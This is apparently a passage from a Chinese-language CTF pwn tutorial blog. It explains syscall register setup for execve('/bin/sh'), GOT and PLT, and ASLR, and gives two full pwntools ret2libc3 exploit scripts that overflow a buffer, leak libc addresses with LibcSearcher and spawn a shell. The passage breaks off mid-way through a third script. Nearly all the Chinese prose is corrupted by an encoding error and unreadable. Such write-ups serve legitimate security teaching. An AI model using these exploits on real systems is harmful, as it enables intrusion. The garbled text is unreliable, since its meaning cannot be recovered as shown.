<p>é™æ€ç¼–è¯‘å¯ä»¥ç®€å•ç†è§£ä¸ºå°†åŠ¨æ€é“¾æ¥åº“ä¸­çš„ä»£ç æ‹·è´å‡ºæ¥æ”¾å…¥å¯¹åº”çš„äºŒè¿›åˆ¶æ–‡ä»¶é‡Œã€‚</p>
<p><strong>å¯„å­˜å™¨</strong></p>
<p>åœ¨32ä½ç³»ç»Ÿä¸­ï¼Œé€šè¿‡<strong>int 0x80</strong>æŒ‡ä»¤è§¦å‘ç³»ç»Ÿè°ƒç”¨ã€‚å…¶ä¸­ï¼ŒEAXå¯„å­˜å™¨ç”¨äºä¼ é€’ç³»ç»Ÿè°ƒç”¨å·ï¼Œå‚æ•°æŒ‰é¡ºåºèµ‹å€¼ç»™<strong>EBXã€ECXã€EDXã€ESIã€</strong></p>
<p><strong>EDIã€EBP</strong>è¿™6ä¸ªå¯„å­˜å™¨ã€‚</p>
<p>åœ¨64ä½ç³»ç»Ÿä¸­ï¼Œä½¿ç”¨<strong>syscall</strong>æŒ‡ä»¤æ¥è§¦å‘ç³»ç»Ÿè°ƒç”¨ï¼ŒåŒæ ·ä½¿ç”¨<strong>EAXï¼ˆRAXï¼‰å¯„å­˜å™¨ä¼ é€’ç³»ç»Ÿè°ƒç”¨å·</strong>ï¼Œ<strong>RDIã€RSIã€RDXã€RCXã€R8ã€R9</strong></p>
<p>è¿™6ä¸ªå¯„å­˜å™¨ç”¨æ¥ä¼ é€’å‚æ•°ã€‚</p>
<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250711172325495.png"  alt="image-20250711172325495"></p>
<p>eg:<code>readï¼ˆ0,buf,0x100ï¼‰</code></p>
<p>32ä½æ—¶ï¼Œeax&#x3D;3ï¼ˆ#define__NR_read 3ï¼‰;ebx&#x3D;0;ecx&#x3D;buf;edx&#x3D;0x100;ï¼Œè®¾ç½®å®Œæ¯ä¸ªå¯„å­˜å™¨çš„å€¼ä¹‹åï¼Œå†æ‰§è¡Œint 0x80æŒ‡ä»¤ï¼Œå°±ä¼šæ‰§è¡Œå¯¹åº”çš„readï¼ˆ0,buf,0x100ï¼‰ã€‚å®é™…ä¸Šï¼Œæœ€åè¿˜ä¼šè¿›å…¥å†…æ ¸æ€æ‰§è¡Œã€‚</p>
<p>64ä½æ—¶ï¼Œrax&#x3D;0ï¼ˆ#define__NR_read 0ï¼‰;rdi&#x3D;0;rsi&#x3D;buf;rdx&#x3D;0x100ï¼Œè®¾ç½®å®Œæ¯ä¸ªå¯„å­˜å™¨çš„å€¼ä¹‹åï¼Œå†æ‰§è¡ŒsyscallæŒ‡ä»¤ï¼Œå°±ä¼šæ‰§è¡Œå¯¹åº”çš„readï¼ˆ0,buf,0x100ï¼‰ã€‚</p>
<p>ä¹Ÿæ˜¯è¿›å…¥å†…æ ¸æ€æ‰§è¡Œã€‚</p>
<p>å¦‚æœæƒ³è¦å®Œæˆ<code>Get shell</code></p>
<p>32ä½æ—¶ï¼Œï¼šeax&#x3D;11ï¼ˆ#define__NR_execve 11ï¼‰;ebx&#x3D;â€&#x2F;bin&#x2F;shâ€;ecx&#x3D;0;edx&#x3D;0;ï¼ˆNULLå®é™…ä¸Šå°±æ˜¯0ï¼‰ï¼Œè®¾ç½®å®Œæ¯ä¸ªå¯„å­˜å™¨çš„å€¼ä¹‹åï¼Œå†æ‰§è¡Œint 0x80æŒ‡ä»¤ï¼Œå°±ä¼šæ‰§è¡Œå¯¹åº”çš„execveï¼ˆâ€&#x2F;bin&#x2F;shâ€,NULL,NULLï¼‰ã€‚</p>
<p>64ä½æ—¶ï¼Œrax&#x3D;59ï¼ˆ#define__NR_execve 59ï¼‰;rdi&#x3D;â€&#x2F;bin&#x2F;shâ€;rsi&#x3D;0;rdx&#x3D;0;</p>
<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250711172348689.png"  alt="image-20250711172348689"></p>
<p>åœ¨idaä¸­çº¢è‰²ä¸ºå¤–éƒ¨å‡½æ•°ï¼Œç™½è‰²ä¸ºå†…éƒ¨å‡½æ•°</p>
<p>é™æ€ç¼–è¯‘çš„äºŒè¿›åˆ¶æ–‡ä»¶å…¨ä¸ºå†…éƒ¨å‡½æ•°</p>
<h3 id="ret2libc3"><a href="#ret2libc3" class="headerlink" title="ret2libc3"></a>ret2libc3</h3><p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250725092324043.png"  alt="image-20250725092324043"></p>
<h4 id="è„šæœ¬-6"><a href="#è„šæœ¬-6" class="headerlink" title="è„šæœ¬"></a>è„šæœ¬</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import LibcSearcher</span><br><span class="line"></span><br><span class="line">p = process(&quot;./ret2libc3&quot;)</span><br><span class="line">#gdb.attach(p, &quot;b *0x0804854C&quot;)</span><br><span class="line"></span><br><span class="line">elf = ELF(&quot;./ret2libc3&quot;)</span><br><span class="line"></span><br><span class="line">gets_got = elf.got[&quot;gets&quot;]</span><br><span class="line">puts_plt = elf.plt[&quot;puts&quot;]</span><br><span class="line">main_addr = 0x0804854E</span><br><span class="line"></span><br><span class="line"># æ³„éœ² gets åœ°å€</span><br><span class="line">p.recvuntil(&quot;ret2libc3\n&quot;)</span><br><span class="line">payload1  = b&quot;a&quot; * 0x108 + b&quot;junk&quot;</span><br><span class="line">payload1 += p32(puts_plt) + p32(main_addr) + p32(gets_got)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line"></span><br><span class="line"># è·å–æ³„éœ²åœ°å€</span><br><span class="line">leak_addr = u32(p.recv(4))</span><br><span class="line"></span><br><span class="line"># ç”¨ LibcSearcher æŸ¥</span><br><span class="line">libc = LibcSearcher(&quot;gets&quot;, leak_addr)#LibcSearcher ä¼šæ ¹æ®ä½ æä¾›çš„å‡½æ•°åå’Œåœ°å€ï¼Œå»åŒ¹é…å·²çŸ¥çš„ libc æ•°æ®åº“</span><br><span class="line">libc_base = leak_addr - libc.dump(&quot;gets&quot;)#libc.dump(&quot;gets&quot;)æ˜¯gets å‡½æ•°åœ¨ libc ä¸­çš„åç§»ï¼ˆç›¸å¯¹äº libc åŸºåœ°å€ï¼‰</span><br><span class="line">system_addr = libc_base + libc.dump(&quot;system&quot;)</span><br><span class="line">binsh_addr  = libc_base + libc.dump(&quot;str_bin_sh&quot;)</span><br><span class="line"></span><br><span class="line">log.success(&quot;libc_base: &quot; + hex(libc_base))</span><br><span class="line">log.success(&quot;system: &quot; + hex(system_addr))</span><br><span class="line">log.success(&quot;/bin/sh: &quot; + hex(binsh_addr))#è¾“å‡ºè¿™ä¸ªè®¡ç®—å‡ºçš„åœ°å€ï¼Œä¾¿äºæ£€æŸ¥</span><br><span class="line"></span><br><span class="line"># ç¬¬äºŒæ¬¡æ”»å‡»</span><br><span class="line">p.recvuntil(&quot;ret2libc3\n&quot;)</span><br><span class="line">payload2  = b&quot;a&quot; * 0x108 + b&quot;junk&quot;</span><br><span class="line">payload2 += p32(system_addr) +p32(0) + p32(binsh_addr)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p><code>payload1 += p32(puts_plt) + p32(main_addr) + p32(gets_got)</code></p>
<p>è°ƒç”¨putå‡½æ•°æ³„éœ²getså‡½æ•°çš„å®é™…åœ°å€ï¼Œå¹¶ä¸”è¿”å›mainå‡½æ•°ï¼Œå†æ¬¡åˆ©ç”¨gotæ¼æ´</p>
<p>å®ƒå†…éƒ¨ä½¿ç”¨çš„æ˜¯ <strong>é¢„å®šä¹‰ç¬¦å·å</strong> ï¼Œæ¯”å¦‚ï¼š</p>
<ul>
<li><code>&quot;system&quot;</code></li>
<li><code>&quot;gets&quot;</code></li>
<li><code>&quot;printf&quot;</code></li>
<li><code>&quot;str_bin_sh&quot;</code> ï¼ˆå°±æ˜¯ä½ è¦æ‰¾çš„ <code>/bin/sh</code>ï¼‰</li>
</ul>
<p>è¿™äº›åå­—ä¸æ˜¯éšä¾¿å†™çš„ï¼Œæ˜¯é¢„å…ˆåœ¨ libc æ•°æ®åº“ä¸­å®šä¹‰å¥½çš„ç¬¦å·åç§°ã€‚</p>
<p>è„šæœ¬æ‰§è¡Œåä¼šæ˜¾ç¤º</p>
<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250715113729689.png"  alt="image-20250715113729689"></p>
<p>è¿™æ˜¯å› ä¸ºç”¨libc &#x3D; LibcSearcher(â€œgetsâ€, leak_addr)è¿›è¡Œé€‰æ‹©é€‚åˆçš„libcåº“ï¼Œä½†ä¸åŒç‰ˆæœ¬çš„libc.soæ–‡ä»¶çš„å˜åŒ–ä¸å¤§ï¼Œä¸€ä¸ªå‡½æ•°çš„åœ°å€çº¦æŸä¸å¤Ÿä¸¥æ ¼ï¼Œæ‰€ä»¥ä¼šæ˜¾ç¤ºå¤šä¸ªlibcç‰ˆæœ¬ä¾›é€‰æ‹©</p>
<h4 id="è§£å†³å¤šä¸ªlibc-soç‰ˆæœ¬ä¾›é€‰æ‹©"><a href="#è§£å†³å¤šä¸ªlibc-soç‰ˆæœ¬ä¾›é€‰æ‹©" class="headerlink" title="è§£å†³å¤šä¸ªlibc.soç‰ˆæœ¬ä¾›é€‰æ‹©"></a>è§£å†³å¤šä¸ªlibc.soç‰ˆæœ¬ä¾›é€‰æ‹©</h4><p>1.å¤šä¸ªçº¦æŸæ¡ä»¶</p>
<p><strong>å“ªäº›ç¬¦å·æœ€ç¨³å¦¥</strong></p>
<p>è¿™æ˜¯ä¸ªå¾ˆé‡è¦çš„é—®é¢˜ï¼š</p>
<blockquote>
<p>ä¸ºä»€ä¹ˆæ³„éœ² gets &#x2F; puts &#x2F; printfï¼Œä¸æ³„éœ² malloc &#x2F; exit &#x2F; system å‘¢ï¼Ÿ</p>
</blockquote>
<p>ç†ç”±ï¼š</p>
<table>
<thead>
<tr>
<th>ç¬¦å·</th>
<th>ç¨³å¦¥ç¨‹åº¦</th>
<th>åŸå› </th>
</tr>
</thead>
<tbody><tr>
<td><strong>puts</strong></td>
<td>ğŸ‘</td>
<td>å‡ ä¹æ¯ä¸ª libc é‡Œéƒ½æœ‰ï¼Œåç§»ç‹¬ç‰¹</td>
</tr>
<tr>
<td><strong>printf</strong></td>
<td>ğŸ‘</td>
<td>å¸¸è§ï¼Œåç§»ç‹¬ç‰¹</td>
</tr>
<tr>
<td><strong>gets</strong></td>
<td>ğŸ‘ï¼ˆä½†æ˜¯ glibc2.28+ è¢«åºŸå¼ƒäº†ï¼‰</td>
<td></td>
</tr>
<tr>
<td><strong>read</strong></td>
<td>ğŸ‘</td>
<td>æ ¸å¿ƒ IOï¼Œå­˜åœ¨ä¸”ç¨³å®š</td>
</tr>
<tr>
<td><strong>write</strong></td>
<td>ğŸ‘</td>
<td>å’Œ read å¯¹åº”</td>
</tr>
<tr>
<td><strong>system</strong></td>
<td>ğŸ‘</td>
<td>å¾ˆå¸¸ç”¨ï¼Œä½†æ˜¯æœ‰çš„ libc æŠŠå®ƒé™æ€é“¾æ¥äº†æˆ–è€…ä½ç½®å¾ˆå¸¸è§</td>
</tr>
<tr>
<td><strong>exit</strong></td>
<td>ğŸ‘</td>
<td>åç§»è¾ƒå°ä¸”å¸¸è§ï¼Œä¸å»ºè®®ç”¨</td>
</tr>
<tr>
<td><strong>__libc_start_main</strong></td>
<td>ğŸ‘</td>
<td>éå¸¸ç¨³å¦¥ï¼Œé€šå¸¸ä¸ä¼šå†²çª</td>
</tr>
</tbody></table>
<p>å› æ­¤å»ºè®®ä½ æ³„éœ²çš„ä¼˜å…ˆçº§æ˜¯ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">puts &gt; printf &gt; read &gt; write &gt; __libc_start_main &gt; gets</span><br></pre></td></tr></table></figure>

<p>ç†æƒ³çŠ¶æ€ä¸‹ï¼Œä½ ä¸€æ¬¡æ€§æ³„éœ²ä¸‰ä¸ªç¬¦å·ï¼Œæ¯”å¦‚ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">puts(gets@got);</span><br><span class="line">puts(puts@got);</span><br><span class="line">puts(printf@got);</span><br></pre></td></tr></table></figure>

<p>ç„¶åç”¨ä¸‰ä¸ªç¬¦å·å»æŸ¥åº“ï¼Œå‡ ä¹100%å”¯ä¸€</p>
<p>ä½†æ˜¯</p>
<p>å½“ç¨‹åºç¼–è¯‘æ—¶ï¼Œåªæœ‰çœŸæ­£è¢«è°ƒç”¨çš„å¤–éƒ¨åº“å‡½æ•°æ‰ä¼šè¢«é“¾æ¥ï¼Œå¹¶ä¸”å®ƒä»¬æ‰ä¼šåœ¨ GOT è¡¨é‡Œæœ‰æ¡ç›®ã€‚</p>
<p>è€Œä½ çš„ç›®æ ‡ç¨‹åº <code>./ret2libc3</code> é‡Œï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bashå¤åˆ¶ç¼–è¾‘gets, puts æœ‰ç”¨åˆ°</span><br><span class="line">printf æ²¡ç”¨åˆ°</span><br></pre></td></tr></table></figure>

<p>æ‰€ä»¥ï¼šåªèƒ½æœ‰ä¸¤ä¸ªçº¦æŸæ¡ä»¶</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">csså¤åˆ¶ç¼–è¾‘elf.got[&quot;gets&quot;] âœ… å­˜åœ¨</span><br><span class="line">elf.got[&quot;puts&quot;] âœ… å­˜åœ¨</span><br><span class="line">elf.got[&quot;printf&quot;] âŒ æŠ¥é”™</span><br></pre></td></tr></table></figure>

<p><strong>è„šæœ¬</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import LibcSearcher</span><br><span class="line"></span><br><span class="line">p = process(&quot;./ret2libc3&quot;)</span><br><span class="line">elf = ELF(&quot;./ret2libc3&quot;)</span><br><span class="line"></span><br><span class="line">gets_got = elf.got[&quot;gets&quot;]</span><br><span class="line">puts_plt = elf.plt[&quot;puts&quot;]</span><br><span class="line">puts_got = elf.got[&quot;puts&quot;]#putsçš„gotè¡¨</span><br><span class="line">main_addr = 0x0804854E</span><br><span class="line"></span><br><span class="line">p.recvuntil(&quot;ret2libc3\n&quot;)</span><br><span class="line">payload1  = b&quot;a&quot; * 0x108 + b&quot;junk&quot;</span><br><span class="line">payload1 += p32(puts_plt) + p32(main_addr) + p32(gets_got)</span><br><span class="line">payload1 += p32(puts_plt) + p32(main_addr) + p32(puts_got)#è¾“å‡ºputsçš„å®é™…ä½ç½®</span><br><span class="line">p.sendline(payload1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">leak_addr = u32(p.recv(4))</span><br><span class="line">leak_puts = u32(p.recv(4))#æ¥æ”¶å…¶ä½ç½®</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(&quot;gets&quot;, leak_addr)</span><br><span class="line">libc.add_condition(&quot;puts&quot;, leak_puts)#å¢åŠ putsçš„ä½ç½®ä½œä¸ºçº¦æŸæ¡ä»¶</span><br><span class="line"></span><br><span class="line">libc_base = leak_addr - libc.dump(&quot;gets&quot;)</span><br><span class="line">system_addr = libc_base + libc.dump(&quot;system&quot;)</span><br><span class="line">binsh_addr  = libc_base + libc.dump(&quot;str_bin_sh&quot;)</span><br><span class="line"></span><br><span class="line">log.success(&quot;libc_base: &quot; + hex(libc_base))</span><br><span class="line">log.success(&quot;system: &quot; + hex(system_addr))</span><br><span class="line">log.success(&quot;/bin/sh: &quot; + hex(binsh_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(&quot;ret2libc3\n&quot;)</span><br><span class="line">payload2  = b&quot;a&quot; * 0x108 + b&quot;junk&quot;</span><br><span class="line">payload2 += p32(system_addr) +p32(0) + p32(binsh_addr)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ä½†æ˜¯è¿™ä¸ªæˆ‘å°è¯•è¿‡å¯¹è¿™ä¸ªé¢˜ç›®æ¥è¯´è¿˜æ˜¯çº¦æŸæ¡ä»¶å¤ªå°‘ï¼Œä½†æ˜¯ç”±äºè¿™ä¸ªé¢˜ç›®è°ƒç”¨å‡½æ•°æ¯”è¾ƒå°‘ï¼Œæ‰€ä»¥å¯ä»¥ä½œä¸ºçº¦æŸçš„å‡½æ•°ä¹Ÿæ¯”è¾ƒå°‘</p>
<p>1ï¼‰GOTã€‚GOTæ˜¯å…¨å±€åç§»é‡è¡¨ï¼ˆGlobal Offset Tableï¼‰ï¼Œç”¨äºå­˜å‚¨å¤–éƒ¨å‡½æ•°åœ¨å†…å­˜ä¸­çš„ç¡®åˆ‡åœ°å€ã€‚GOTå­˜å‚¨åœ¨æ•°æ®æ®µï¼ˆData Segmentï¼‰å†…ï¼Œå¯ä»¥åœ¨ç¨‹åºè¿è¡Œè¿‡ç¨‹ä¸­è¢«ä¿®æ”¹ã€‚</p>
<p>2ï¼‰PLTæ˜¯ç¨‹åºé“¾æ¥è¡¨ï¼ˆProcedure Linkage Tableï¼‰ï¼Œç”¨æ¥å­˜å‚¨å¤–éƒ¨å‡½æ•°çš„å…¥å£ç‚¹ï¼ˆentryï¼‰ï¼Œæ¢è¨€ä¹‹ï¼Œç¨‹åºä¼šåˆ°PLTä¸­å¯»æ‰¾å¤–éƒ¨å‡½æ•°çš„åœ°å€ã€‚PLTå­˜å‚¨åœ¨ä»£ç æ®µï¼ˆCode Segmentï¼‰å†…ï¼Œåœ¨è¿è¡Œä¹‹å‰å°±å·²ç»ç¡®å®šå¹¶ä¸”ä¸ä¼šè¢«ä¿®æ”¹ã€‚</p>
<p><strong>ç®€å•æ¥è®²ï¼ŒGOTæ˜¯ä¸ªæ•°æ®è¡¨ï¼Œå­˜å‚¨çš„æ˜¯å¤–éƒ¨å‡½æ•°çš„åœ°å€ï¼Œå…·æœ‰è¯»å†™æƒé™ï¼ˆåœ¨FULL RELROä¿æŠ¤æœºåˆ¶å¼€å¯çš„æ—¶å€™ï¼Œæ²¡æœ‰è¯»å†™æƒé™ï¼‰ï¼›PLTæ˜¯å¤–éƒ¨å‡½æ•°çš„å…¥å£è¡¨ï¼Œå­˜å‚¨çš„æ˜¯æ¯ä¸ªå¤–éƒ¨å‡½æ•°çš„ä»£ç ï¼Œå…·æœ‰æ‰§è¡Œæƒé™ã€‚</strong></p>
<p><strong>å°½ç®¡ <code>libc</code> çš„åŠ è½½åœ°å€æ˜¯éšæœºçš„ï¼ˆASLRï¼‰ï¼Œä½†åœ¨libcä¸åŒçš„æƒ…å†µä¸‹ <code>libc</code> å†…éƒ¨æ‰€æœ‰å‡½æ•°ç›¸å¯¹äº <code>libc</code> åŸºåœ°å€çš„åç§»é‡æ˜¯å›ºå®šä¸å˜çš„ã€‚è¿™æ˜¯ <code>ret2libc</code> æ”»å‡»çš„åŸºç¡€ã€‚</strong></p>
<p><strong>å®é™…åœ°å€&#x3D;åŸºå€+åç§»</strong></p>
<p>å½“ä½ å†™äº†ä¸€ä¸ªç¨‹åºä½¿ç”¨äº† <code>libc</code> ä¸­çš„å‡½æ•°ï¼ˆå¦‚ <code>printf</code>ï¼‰ï¼Œè¿™ä¸ªå‡½æ•°çš„å…·ä½“åœ°å€åœ¨ç¼–è¯‘æ—¶æ˜¯æœªçŸ¥çš„ï¼Œå› ä¸º libc è¢«åŠ è½½çš„ä½ç½®ä¼šå›  ASLRï¼ˆåœ°å€ç©ºé—´å¸ƒå±€éšæœºåŒ–ï¼‰è€Œå˜åŒ–ã€‚</p>
<table>
<thead>
<tr>
<th>å‡½æ•°åç§°</th>
<th>å†…å®¹</th>
</tr>
</thead>
<tbody><tr>
<td>PLT</td>
<td>æä¾›è·³è½¬æ¡©ä»£ç </td>
</tr>
<tr>
<td>GOT</td>
<td>å­˜æ”¾å®é™…å‡½æ•°åœ°å€</td>
</tr>
</tbody></table>
<p>å½“ä½ çš„ç¨‹åºè°ƒç”¨ <code>printf()</code> æ—¶ï¼Œå®é™…ä¸Šè°ƒç”¨çš„æ˜¯ PLT ä¸­çš„ <code>printf@plt</code>ï¼ŒPLT å†é€šè¿‡ GOT æŸ¥æ‰¾çœŸæ­£çš„åœ°å€ã€‚</p>
<h4 id="ğŸ”-æ€»ç»“å¯¹æ¯”ï¼ˆé‡ç‚¹æ¥äº†ï¼ï¼‰"><a href="#ğŸ”-æ€»ç»“å¯¹æ¯”ï¼ˆé‡ç‚¹æ¥äº†ï¼ï¼‰" class="headerlink" title="ğŸ” æ€»ç»“å¯¹æ¯”ï¼ˆé‡ç‚¹æ¥äº†ï¼ï¼‰"></a>ğŸ” æ€»ç»“å¯¹æ¯”ï¼ˆé‡ç‚¹æ¥äº†ï¼ï¼‰</h4><table>
<thead>
<tr>
<th></th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td><strong>ä¸ºä»€ä¹ˆå¯ä»¥ç”¨ system@pltï¼Ÿ</strong></td>
<td>å› ä¸ºå®ƒæ˜¯ libc ä¸­<code>system()</code>å‡½æ•°çš„â€œå…¥å£å¤§é—¨â€ï¼Œè¿›å»ä»¥åå°±ä¼šè‡ªåŠ¨è·³è¿‡å»ï¼Œä¸ç”¨ä½ è‡ªå·±å»æ‰¾è·¯ã€‚</td>
</tr>
<tr>
<td><strong>ä¸ºä»€ä¹ˆä¸ç”¨ GOTï¼Ÿ</strong></td>
<td>å› ä¸ºæˆ‘ä»¬ä¸æ˜¯è¦è¯»å–åœ°å€ï¼Œè€Œæ˜¯è¦è°ƒç”¨å‡½æ•°ã€‚PLT å°±åƒæŒ‰é’®ï¼ŒæŒ‰ä¸‹å»å°±èƒ½è¿è¡Œå‡½æ•°ï¼Œä¸éœ€è¦å…ˆçœ‹åœ°å€ã€‚</td>
</tr>
<tr>
<td><strong>ä»€ä¹ˆæ—¶å€™å¿…é¡»ç”¨ GOTï¼Ÿ</strong></td>
<td>å½“ä½ åœ¨è¿œç¨‹æœåŠ¡å™¨ä¸Šä¸çŸ¥é“ libc ç‰ˆæœ¬å’Œåœ°å€æ—¶ï¼Œå¿…é¡»å…ˆé€šè¿‡ GOT æ³„éœ²ä¸€ä¸ªå‡½æ•°åœ°å€ï¼Œæ‰èƒ½è®¡ç®—å‡ºå…¶ä»–å‡½æ•°çš„åœ°å€ã€‚</td>
</tr>
<tr>
<td><strong>ä»€ä¹ˆæ—¶å€™èƒ½ç›´æ¥ç”¨ PLTï¼Ÿ</strong></td>
<td>å½“ä½ åœ¨æœ¬åœ°è°ƒè¯•ã€libc æ˜¯å›ºå®šçš„ï¼Œè€Œä¸”ç¨‹åºæ²¡å¼€ PIEï¼ˆåœ°å€ä¸éšæœºåŒ–ï¼‰çš„æ—¶å€™ï¼Œå°±å¯ä»¥ç›´æ¥è°ƒç”¨ PLTã€‚</td>
</tr>
</tbody></table>
<p><code>ret2libc3</code> å¯ä»¥ç”¨ <code>ret2syscall</code> çš„æ–¹æ³•æ¥æ”»å‡»ï¼Œåªéœ€è¦æ‰¾åˆ°ç‰¹å®šçš„ã€å›ºå®šçš„ ROP gadgets å’Œ <code>int 0x80</code> æŒ‡ä»¤ã€‚</p>
<p>é€‰æ‹© <code>ret2libc</code> çš„æ–¹æ³•ï¼Œé€šå¸¸æ˜¯å› ä¸º <code>system()</code> å‡½æ•°æä¾›çš„ä¾¿æ·æ€§æ›´é«˜ï¼Œè™½ç„¶å¤šäº†ä¸€æ­¥ <code>libc</code> æ³„éœ²çš„å¼€é”€ï¼Œä½†åœ¨å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œè¿™ç§æ–¹æ³•æ›´â€œç®€å•â€ä¸”æ›´â€œé€šç”¨â€ã€‚</p>
<p>åœ¨å®é™…çš„ CTF æ¯”èµ›ä¸­ï¼Œæ”»å‡»è€…ä¼šæ ¹æ®ç›®æ ‡ç¨‹åºçš„å…·ä½“æƒ…å†µï¼ˆæ˜¯å¦æœ‰æ˜“äºåˆ©ç”¨çš„ <code>int 0x80</code>ã€æ˜¯å¦æœ‰è¶³å¤Ÿçš„ gadgetsã€æ˜¯å¦æœ‰ <code>&quot;/bin/sh&quot;</code> å­—ç¬¦ä¸²ç­‰ï¼‰æ¥é€‰æ‹©æœ€ç®€å•ã€æœ€å¯é çš„æ”»å‡»æ–¹æ³•ã€‚</p>
<p><code>ret2libc</code>3 ä¹‹æ‰€ä»¥éœ€è¦æ³„éœ² <code>libc</code> åœ°å€ï¼Œæ˜¯å› ä¸ºå®ƒ<strong>ä¾èµ–äºè°ƒç”¨ <code>libc</code> åº“ä¸­</strong>ï¼ˆè€Œéç¨‹åºè‡ªèº«ï¼‰çš„<strong>å°è£…å‡½æ•°</strong>ï¼ˆå¦‚ <code>system()</code>ï¼‰ï¼Œè€Œè¿™äº› <code>libc</code> å‡½æ•°çš„åœ°å€ä¼šå—åˆ° <strong>ASLR (åœ°å€ç©ºé—´å¸ƒå±€éšæœºåŒ–)</strong> çš„å½±å“è€ŒéšæœºåŒ–ã€‚<code>ret2syscall</code> èƒ½å¤Ÿä¸æ³„éœ² <code>libc</code> åœ°å€ï¼Œæ˜¯å› ä¸ºå®ƒ<strong>ä¾èµ–äºç¨‹åºè‡ªèº«æˆ–åŠ è½½åˆ°å›ºå®šåœ°å€çš„å…±äº«åº“ä¸­</strong>çš„ <strong>ROP gadget</strong> å’Œ <strong><code>int 0x80</code> æŒ‡ä»¤</strong>ï¼Œè¿™äº›åœ°å€åœ¨æ²¡æœ‰ PIE (ä½ç½®æ— å…³å¯æ‰§è¡Œæ–‡ä»¶) çš„æƒ…å†µä¸‹æ˜¯å›ºå®šçš„ã€‚</p>
<h3 id="ret2libc3-x64"><a href="#ret2libc3-x64" class="headerlink" title="ret2libc3_x64"></a>ret2libc3_x64</h3><p>32ä½ç¨‹åºçš„payloadéƒ½æ˜¯åœ¨è¿”å›åœ°å€ä¹‹ååŠ ä¸Šå‚æ•°ï¼Œè€Œ64ä½æ˜¯åœ¨è¿”å›åœ°å€ä¹‹å‰æŠŠå‚æ•°æ”¾å…¥å¯„å­˜å™¨ä¸­</p>
<p>64ä½ç¨‹åºå’Œ32ä½ç¨‹åºçš„ROPæŠ€æœ¯çš„ä¸åŒç‚¹åœ¨äº<strong>å‚æ•°ä¼ é€’</strong>çš„æ–¹å¼ä¸åŒã€‚64ä½ç¨‹åºçš„å‰6ä¸ªå‚æ•°æ˜¯rdi,rsi,rdx,rcx,r8,r9ï¼Œåç»­å‚æ•°æ‰ä¼šæ”¾åœ¨æ ˆä¸Šï¼Œæ‰€ä»¥64ä½ç¨‹åºçš„ROPå’Œret2syscallå‡ ä¹æ˜¯ä¸€æ ·çš„ï¼Œéƒ½æ˜¯å…ˆæ§åˆ¶å¯„å­˜å™¨ï¼Œå†è·³è½¬åˆ°å¯¹åº”çš„å‡½æ•°è¿›è¡Œæ“ä½œã€‚</p>
<h4 id="è„šæœ¬-7"><a href="#è„šæœ¬-7" class="headerlink" title="è„šæœ¬"></a>è„šæœ¬</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span 